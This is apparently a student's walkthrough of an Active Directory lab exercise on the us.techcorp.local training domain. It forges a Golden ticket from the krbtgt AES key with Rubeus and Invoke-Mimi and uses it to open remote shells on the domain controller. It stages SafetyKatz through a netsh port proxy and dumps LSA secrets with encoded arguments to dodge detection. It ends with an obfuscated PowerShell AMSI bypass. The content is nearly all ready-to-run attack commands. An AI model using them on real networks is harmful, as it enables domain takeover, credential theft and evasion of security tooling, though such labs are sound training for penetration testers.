
Task 
• Using the NTLM hash or AES key of krbtgt account of us.techcorp.local, create a Golden ticket.
• Use the Golden ticket to (once again) get domain admin privileges from a machine.


From one of the previous hands-on, we have domain admin privileges (we abused the printer bug on usweb with unconstrained delegation and ran DCSync attack). Let’s use the AES keys of krbtgt account to create a Golden ticket.

Use the below Rubeus command to generate an OPSEC friendly command for Golden ticket. Note that 3 LDAP queries are sent to the DC to retrieve the required information. We will once again use ArgsSplit.bat to encode "golden":

```
echo %Pwn% golden
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd
```

![[Pasted image 20250319010343.png]]

Now, use the generated command to forge a Golden ticket. Remember to add /ptt at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain. Note that we will once again use Loader.exe and ArgsSplit.bat to encode "golden":

```
C:\AD\Tools\Loader.exe golden /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /pwdlastset:"7/5/2019 12:42:09 AM" /minpassage:1 /logoncount:879 /netbios:US /groups:544,512,520,513 /dc:US-DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

![[Pasted image 20250319010458.png]]

The Golden ticket is injected in the current session, we should be able to access any resource in the domain as administrator (DA):

```
winrs -r:us-dc cmd
```

![[Pasted image 20250319010604.png]]

Now, to extract all the secrets in the domain from the domain controller, we can use the below command. Run the below commands from a command prompt where we injected the Golden Ticket

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
```

```
winrs -r:us-dc cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

Use ArgSplit.bat on the student VM to encode "lsadump::lsa":

```
echo %Pwn%  lsadump::lsa
```

Copy the generated commands and use it on the winrs session on us-dc:

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
```

![[Pasted image 20250319010902.png]]

Using Invoke-Mimi.ps1and PowerShell Remoting 

We can also use Invoke-Mimi from a normal PowerShell session:

```
. C:\AD\Tools\Invoke-Mimi.ps1
```

```
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

![[Pasted image 20250319011014.png]]

Access the DC using PowerShell Remoting:

```
 Enter-PSSession -ComputerName us-dc
```

```
 $sess = New-PSSession us-dc.us.techcorp.local
```

```
 Enter-PSSession -Session $sess
```

```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

![[Pasted image 20250319011144.png]]

